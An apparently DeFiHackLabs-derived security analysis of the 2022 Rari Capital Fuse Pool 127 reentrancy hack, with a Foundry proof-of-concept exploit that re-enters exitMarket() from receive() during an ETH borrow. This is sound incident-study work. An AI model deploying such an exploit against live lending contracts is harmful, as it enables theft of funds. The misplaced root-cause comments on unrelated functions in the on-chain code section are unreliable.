# Rari Capital Fuse — ERC20 Reentrancy Over-Borrowing Against Collateral Analysis

| Item | Details |
|------|------|
| **Date** | 2022-04-30 |
| **Protocol** | Rari Capital Fuse (Pool 127) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$80,000,000 (ETH, USDC) |
| **Attacker** | Attacker address unconfirmed |
| **Attack Tx** | Block 14,684,813 |
| **Vulnerable Contract** | fETH_127 [0x26267e41CeCa7C8E0f143554Af707336f27Fa051](https://etherscan.io/address/0x26267e41CeCa7C8E0f143554Af707336f27Fa051) |
| **Root Cause** | A callback triggered during ETH transfer in the `borrow()` function of a Compound fork allows reentrancy, enabling additional borrowing before collateral state is updated |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-04/Rari_exp.sol) |

---
## 1. Vulnerability Overview

Rari Capital's Fuse is a Compound V2 fork platform that allows anyone to create independent lending pools. The fETH contract (`fETH_127`) in Pool 127 directly transfers ETH (`call{value: amount}("")`) when borrowing ETH, which triggers the recipient's fallback function.

The attacker borrowed 150M USDC via a Balancer flash loan, minted fUSDC, registered it as collateral, then borrowed ETH from fETH_127. During the ETH transfer, the fallback called `exitMarket()` to remove the collateral. Even after the collateral was removed, the already-borrowed ETH was not returned, leaving the attacker holding ETH with no collateral backing.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable CEther(fETH).borrow() (Compound fork pseudocode)
contract CEther {
    mapping(address => uint256) public borrowBalances;

    function borrow(uint256 borrowAmount) external returns (uint256) {
        // Collateral sufficiency check
        uint256 allowed = comptroller.borrowAllowed(address(this), msg.sender, borrowAmount);
        require(allowed == 0, "borrow not allowed");

        // ❌ ETH transfer triggers fallback → reentrancy possible
        // At this point, borrowBalances has not yet been updated
        (bool success,) = msg.sender.call{value: borrowAmount}("");
        require(success, "ETH transfer failed");

        // ❌ Borrow balance update occurs after ETH transfer
        borrowBalances[msg.sender] += borrowAmount;

        emit Borrow(msg.sender, borrowAmount, ...);
        return NO_ERROR;
    }
}

// Inside fallback:
// comptroller.exitMarket(fUSDC) is called → USDC collateral removed
// Already borrowed ETH is retained, collateral is released

// ✅ Correct pattern (CEI + nonReentrant)
contract CEtherFixed {
    function borrow(uint256 borrowAmount) external nonReentrant returns (uint256) {
        // ✅ Update state first (Effects)
        borrowBalances[msg.sender] += borrowAmount;

        uint256 allowed = comptroller.borrowAllowed(address(this), msg.sender, borrowAmount);
        require(allowed == 0, "borrow not allowed");

        // ✅ Then transfer ETH (Interactions)
        (bool success,) = msg.sender.call{value: borrowAmount}("");
        require(success, "ETH transfer failed");

        return NO_ERROR;
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**CToken.sol** — Entry point:
```solidity
// ❌ Root cause: A callback triggered during ETH transfer in the Compound fork's `borrow()` function allows reentrancy, enabling additional borrowing before collateral state is updated
    function initialize(ComptrollerInterface comptroller_,
                        InterestRateModel interestRateModel_,
                        uint initialExchangeRateMantissa_,
                        string memory name_,
                        string memory symbol_,
                        uint8 decimals_,
                        uint256 reserveFactorMantissa_,
                        uint256 adminFeeMantissa_) public {
        require(msg.sender == address(fuseAdmin), "only Fuse admin may initialize the market");
        require(accrualBlockNumber == 0 && borrowIndex == 0, "market may only be initialized once");  // ❌ Initialization check

        // Set initial exchange rate
        initialExchangeRateMantissa = initialExchangeRateMantissa_;
        require(initialExchangeRateMantissa > 0, "initial exchange rate must be greater than zero.");

        // Set the comptroller
        uint err = _setComptroller(comptroller_);
        require(err == uint(Error.NO_ERROR), "setting comptroller failed");

        // Initialize block number and borrow index (block number mocks depend on comptroller being set)
    // ... (truncated)

        // Set the interest rate model (depends on block number / borrow index)
        err = _setInterestRateModelFresh(interestRateModel_);
        require(err == uint(Error.NO_ERROR), "setting interest rate model failed");

        name = name_;
        symbol = symbol_;
        decimals = decimals_;

        // Set reserve factor
        err = _setReserveFactorFresh(reserveFactorMantissa_);
        require(err == uint(Error.NO_ERROR), "setting reserve factor failed");

        // Set admin fee
        err = _setAdminFeeFresh(adminFeeMantissa_);
        require(err == uint(Error.NO_ERROR), "setting admin fee failed");

        // The counter starts true to prevent changing it from zero to non-zero (i.e. smaller cost/refund)
        _notEntered = true;
    }
```

**Comptroller.sol** — Related contract:
```solidity
// ❌ Root cause: A callback triggered during ETH transfer in the Compound fork's `borrow()` function allows reentrancy, enabling additional borrowing before collateral state is updated
    function addToMarketInternal(CToken cToken, address borrower) internal returns (Error) {  // ❌ Vulnerability
        Market storage marketToJoin = markets[address(cToken)];

        if (!marketToJoin.isListed) {
            // market is not listed, cannot join
            return Error.MARKET_NOT_LISTED;
        }

        if (marketToJoin.accountMembership[borrower] == true) {
            // already joined
            return Error.NO_ERROR;
        }

        // survived the gauntlet, add to list
        // NOTE: we store these somewhat redundantly as a significant optimization
        //  this avoids having to iterate through the list for the most common use cases
        //  that is, only when we need to perform liquidity checks
        //  and not whenever we want to check if an account is in a particular market
        marketToJoin.accountMembership[borrower] = true;
        accountAssets[borrower].push(cToken);
        
        // Add to allBorrowers
        if (!borrowers[borrower]) {
            allBorrowers.push(borrower);
            borrowers[borrower] = true;
            borrowerIndexes[borrower] = allBorrowers.length - 1;
        }

        emit MarketEntered(cToken, borrower);

        return Error.NO_ERROR;
    }
```

**CTokenInterfaces.sol** — Related contract:
```solidity
// ❌ A callback triggered during ETH transfer in the Compound fork's `borrow()` function allows reentrancy, enabling additional borrowing before collateral state is updated
    function borrow(uint borrowAmount) external returns (uint);  // ❌ Vulnerability
    function repayBorrow(uint repayAmount) external returns (uint);
    function repayBorrowBehalf(address borrower, uint repayAmount) external returns (uint);
    function liquidateBorrow(address borrower, uint repayAmount, CTokenInterface cTokenCollateral) external returns (uint);

}

contract CEtherInterface is CErc20Storage {
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract (implements ETH fallback reentrancy)
    │
    ├─[1] Balancer flashLoan(150,000,000 USDC)
    │
    ├─[2] [Inside receiveFlashLoan]
    │       │
    │       ├─ fusdc_127.accrueInterest()
    │       ├─ USDC.approve(fusdc_127) → fusdc_127.mint(150M USDC)
    │       ├─ rari_Comptroller.enterMarkets([fusdc_127])
    │       │       Register fUSDC as collateral
    │       │
    │       ├─ fETH_127.borrow(1,977 ETH)
    │       │       ↓ ETH transfer → fallback executes
    │       │           │
    │       │           └─ [Reentrancy] rari_Comptroller.exitMarket(fusdc_127)
    │       │                   USDC collateral removed!
    │       │                   (possible because borrow balance not yet updated)
    │       │
    │       ├─ fusdc_127.redeemUnderlying(150M USDC)
    │       │       Collateral already removed, full USDC withdrawal possible
    │       │
    │       └─ Repay Balancer flash loan
    │
    └─[3] Loss: 1,977 ETH + other assets (~$80M)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface ICErc20 {
    function mint(uint256 mintAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function accrueInterest() external returns (uint256);
}

interface ICEther {
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
}

contract ContractTest is Test {
    IBalancerVault balancer =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 USDC     = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ICErc20 fusdc   = ICErc20(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);
    ICEther feth    = ICEther(0x26267e41CeCa7C8E0f143554Af707336f27Fa051);
    IComptroller comptroller =
        IComptroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);

    bool reentrant = false;

    function setUp() public {
        vm.createSelectFork("mainnet", 14_684_813);
    }

    function testExploit() public {
        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 150_000_000 * 1e6; // 150M USDC

        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        // [Step 1] Mint fUSDC and register as collateral
        USDC.approve(address(fusdc), type(uint256).max);
        fusdc.accrueInterest();
        fusdc.mint(amounts[0]);

        address[] memory markets = new address[](1);
        markets[0] = address(fusdc);
        comptroller.enterMarkets(markets);

        // [Step 2] Borrow ETH → reentrancy via fallback
        feth.borrow(1_977 ether); // ← receive() executes on ETH transfer

        // [Step 3] Withdraw USDC after collateral removal
        fusdc.redeemUnderlying(amounts[0]);

        // [Step 4] Repay Balancer
        USDC.transfer(address(balancer), amounts[0]);
    }

    // Automatically executes on ETH receipt: removes collateral before borrow state update
    receive() external payable {
        if (!reentrant) {
            reentrant = true;
            // ⚡ Reentrancy: remove collateral before borrow balance is updated
            comptroller.exitMarket(address(fusdc));
            reentrant = false;
        }
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack (ETH transfer reentrancy) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **OWASP DeFi** | ETH borrow callback reentrancy |
| **Attack Vector** | fETH.borrow() → ETH transfer → receive() → exitMarket() |
| **Preconditions** | Missing nonReentrant, CEI pattern not followed |
| **Impact** | Uncollateralized borrowing proportional to flash loan size |

---
## 6. Remediation Recommendations

1. **Apply nonReentrant globally**: Apply to all functions — `borrow`, `mint`, `redeem`, `exitMarket`.
2. **CEI Pattern**: Update borrow balance before transferring ETH.
3. **Compound Fork Security**: When forking Compound V2, separately audit ETH-handling functions for reentrancy exposure.
4. **Fuse Pool Isolation**: Independent Fuse pools share the same vulnerable code, meaning a bug in one pool affects all. The code-sharing approach should be re-evaluated.

---
## 7. Lessons Learned

- **$80M ETH Loss**: The Rari Fuse attack was one of the largest reentrancy attacks in DeFi history as of April 2022.
- **ETH Handling in Compound Forks**: The CEther contract, which handles ETH directly, carries additional reentrancy risk compared to ERC20 cToken contracts.
- **Saddle Finance Also Attacked the Same Day**: On April 30, 2022, Saddle Finance was also exploited on the same day (via a different vulnerability).
- **Tribe DAO Merger**: Rari Capital suffered severe damage from this incident, and the aftermath included the collapse of its planned merger with Tribe DAO.